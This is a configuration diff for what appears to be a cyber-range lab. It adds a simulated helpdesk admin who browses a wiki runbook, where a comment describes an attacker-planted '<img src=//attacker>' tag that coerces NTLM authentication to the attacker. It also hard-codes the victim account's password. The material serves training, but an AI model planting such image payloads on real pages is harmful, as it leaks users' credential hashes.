@@ -38,6 +38,15 @@ charlie_vpn_product: "OpenVPN"
 charlie_vpn_portal: "vpn.tlo-corp.com"
 charlie_vpn_internal_cidr: "10.30.0.0/24"
 
+# --- simulated privileged victim browser (M4.2) -----------------------------
+# helpdesk_admin (autologged-in on this host) habitually opens the wiki VPN
+# runbook; rendering the page triggers the attacker-planted <img src=//attacker>
+# -> NTLM coercion. Replaces ludus_ghosts_client (no GHOSTS server available).
+charlie_enable_victim_browser: true
+charlie_wiki_url: "http://wiki.charlie.local/books/it/page/vpn-runbook"
+charlie_victim_user: helpdesk_admin
+charlie_victim_password: "Helpdesk!Adm1n"
+
 # --- optional on-target .kdbx rebuild (FALLBACK) ----------------------------
 # Primary delivery is the prebuilt files/passwords.kdbx (win_copy). If you must
 # rebuild on the host instead (e.g. after editing entries), set this true: the
